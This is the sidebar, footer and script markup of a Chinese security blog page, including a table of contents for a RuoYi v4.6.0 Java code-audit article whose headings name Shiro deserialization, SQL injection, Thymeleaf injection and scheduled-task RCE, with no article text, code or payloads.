class="announcement_content">换博客主题了，感觉还是这个主题更好看，而且功能也多，但是好多功能暂且没设置，以后再弄。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8B%A5%E4%BE%9D%E4%B8%ADshiro%E7%9A%84%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text">若依中shiro的权限问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%9D%E6%AD%A5%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">0x02 初步审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.1.</span> <span class="toc-text">1. shiro反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">2. SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">3. Thymeleaf模板注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE"><span class="toc-number">3.4.</span> <span class="toc-text">4. 计划任务RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%BB%93%E8%AF%AD"><span class="toc-number">4.</span> <span class="toc-text">0x04 结语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/" title="java代码审计——若依v4.6.0"><img src="/img/art/a11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计——若依v4.6.0"/></a><div class="content"><a class="title" href="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/" title="java代码审计——若依v4.6.0">java代码审计——若依v4.6.0</a><time datetime="2024-05-11T07:14:43.000Z" title="发表于 2024-05-11 15:14:43">2024-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94Jfinalcms/" title="java代码审计——Jfinalcms"><img src="/img/art/a7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计——Jfinalcms"/></a><div class="content"><a class="title" href="/2024/05/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94Jfinalcms/" title="java代码审计——Jfinalcms">java代码审计——Jfinalcms</a><time datetime="2024-05-07T07:53:17.000Z" title="发表于 2024-05-07 15:53:17">2024-05-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/30/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8FERP-v2-3/" title="java代码审计--华夏ERP_v2.3"><img src="/img/art/a4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计--华夏ERP_v2.3"/></a><div class="content"><a class="title" href="/2024/04/30/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8FERP-v2-3/" title="java代码审计--华夏ERP_v2.3">java代码审计--华夏ERP_v2.3</a><time datetime="2024-04-30T09:47:43.000Z" title="发表于 2024-04-30 17:47:43">2024-04-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/27/snakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/" title="snakeYaml反序列化分析"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="snakeYaml反序列化分析"/></a><div class="content"><a class="title" href="/2024/04/27/snakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/" title="snakeYaml反序列化分析">snakeYaml反序列化分析</a><time datetime="2024-04-27T10:47:18.000Z" title="发表于 2024-04-27 18:47:18">2024-04-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/17/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94Jspxcms/" title="java代码审计——Jspxcms"><img src="/img/art/a10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计——Jspxcms"/></a><div class="content"><a class="title" href="/2024/04/17/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94Jspxcms/" title="java代码审计——Jspxcms">java代码审计——Jspxcms</a><time datetime="2024-04-17T10:25:02.000Z" title="发表于 2024-04-17 18:25:02">2024-04-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/art/a11.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By XiLitter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
